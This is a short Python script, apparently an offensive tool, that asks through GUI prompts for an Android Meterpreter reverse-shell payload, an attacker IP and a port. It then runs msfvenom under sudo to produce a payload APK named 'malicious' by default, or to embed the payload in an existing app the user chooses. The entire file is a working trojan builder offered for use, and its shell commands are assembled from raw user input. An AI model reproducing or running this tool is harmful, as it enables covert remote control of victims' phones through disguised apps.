from termcolor import colored 
import pyautogui as pa  

#banner
def col_disp(message,color,slant=False):
    from os import system as sys
    import subprocess as sb
    if slant==True:
        output=sb.run(['figlet','-cf','slant',message],capture_output=True,text=True)
    else:
        output=sb.run(['figlet','-c',message],capture_output=True,text=True)
    print(colored(output.stdout,color))
col_disp("HACK",'yellow')
col_disp('Android','cyan',True)  
print(colored('\t\t\t\t---- by GRootS645', 'red'))


#get inputs
x=int(pa.prompt(text='Enter the payload number\n1.reverse tcp\n2.reverse https\n3.reverse http', title='Android payloads' , default='1'))
options=[1,2,3]
payloads=['android/meterpreter/reverse_tcp','android/meterpreter/reverse_https','android/meterpreter/reverse_http']
payload=payloads[x-1]
print(colored('you have selected::>','white')+str(colored(payload,'yellow')))

import netifaces as ni
#ii=ni.ifaddresses('wlx20e417083498')
ii=ni.interfaces()
x=int(pa.prompt(text='Enter the interface number:\n(leave blank to enter manually)\n'+'\n'.join(ii), title='select interface' , default='0'))
if x!=0:
    ip = ni.ifaddresses(ii[x-1])[ni.AF_INET][0]['addr']
else:
    ip=pa.prompt(text='Enter the IP', title='Enter IP') 
print(colored("IP:",'white')+str(colored(ip,'yellow')))
port=pa.prompt(text='Enter the port number', title='select port' ,default='4444')
print(colored("Port:",'white')+str(colored(port,'yellow')))
filename=pa.prompt(text='Enter filename without .apk', title='Filename' , default='malicious')
apkPath=pa.prompt(text='Specify the path to the apk', title='do you want to embed payload to any apk\n(if not leave it blank)',default='Nope')

#create payload
import os
if apkPath=='Nope':
    os.system('sudo msfvenom -p '+payload+' LHOST='+str(ip)+' LPORT='+str(port)+' R >'+filename+'.apk')
else:
    os.system('sudo msfvenom -x '+apkPath+' -p '+payload+' LHOST='+str(ip)+' LPORT='+str(port)+' R >'+filename+'.apk')
    
print(colored("Payload apk is generated in your current directory.\n\n",'white')+colored('\nGRootS645 ','cyan')+colored(' is not responsible for your mistakes!!!','red'))


